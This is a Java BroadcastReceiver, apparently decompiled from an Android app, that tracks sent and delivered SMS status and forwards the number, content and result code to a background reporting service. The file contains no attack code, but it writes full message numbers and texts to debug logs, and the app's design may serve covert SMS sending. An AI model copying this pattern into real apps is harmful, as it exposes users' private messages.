package com.yongding.logic;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import com.clouds.debug.SystemDebug;
import com.clouds.server.BackSMSMessageService;
import com.yongding.util.UtilSms;

public class SmsReceiver extends BroadcastReceiver {
    public static final String BACK_SMS_RESULTCODE_ACTION = "com.clouds.server.BACK_SMS_RESULTCODE_ACTION";
    public static final int DELIVERED_NO_SEND_SMS = 104;
    public static final int DELIVERED_SMS_FAIL = 103;
    public static final int DELIVERED_SMS_SUCCESS = 102;
    public static final int SEND_SMS_FAIL = 101;
    public static final int SEND_SMS_SUCCESS = 100;
    public static final String SMS_RESULTCODE = "sms_resultCode";
    private static final String TAG;

    static {
        TAG = SmsReceiver.class.getSimpleName();
    }

    public static void backSMSService(Context context, String action, String number, String content, int resultCode) {
        Intent serviceIntent = new Intent();
        serviceIntent.setClass(context, BackSMSMessageService.class);
        serviceIntent.setAction(action);
        serviceIntent.putExtra(UtilSms.NUMBER, number);
        serviceIntent.putExtra(UtilSms.CONTENT, content);
        serviceIntent.putExtra(SMS_RESULTCODE, resultCode);
        context.startService(serviceIntent);
    }

    public void onReceive(Context context, Intent intent) {
        if (intent != null) {
            String actionName = intent.getAction();
            int resultCode = getResultCode();
            SystemDebug.e(TAG, new StringBuilder("actionName: ").append(actionName).append(" resultCode: ").append(resultCode).toString());
            String number;
            String content;
            if (UtilSms.SENT_SMS_ACTION.equalsIgnoreCase(actionName)) {
                number = intent.getStringExtra(UtilSms.NUMBER);
                content = intent.getStringExtra(UtilSms.CONTENT);
                int smsResultCode = -1 == resultCode ? SEND_SMS_SUCCESS : SEND_SMS_FAIL;
                SystemDebug.e(TAG, new StringBuilder("number: ").append(number).append(" content: ").append(content).append(" intent: ").append(intent).toString());
                backSMSService(context, BACK_SMS_RESULTCODE_ACTION, number, content, smsResultCode);
            } else if (UtilSms.DELIVERED_SMS_ACTION.equalsIgnoreCase(actionName)) {
                number = intent.getStringExtra(UtilSms.NUMBER);
                content = intent.getStringExtra(UtilSms.CONTENT);
                SystemDebug.e(TAG, new StringBuilder("number: ").append(number).append(" content: ").append(content).toString());
                backSMSService(context, BACK_SMS_RESULTCODE_ACTION, number, content, -1 == resultCode ? DELIVERED_SMS_SUCCESS : DELIVERED_SMS_FAIL);
            }
        }
    }
}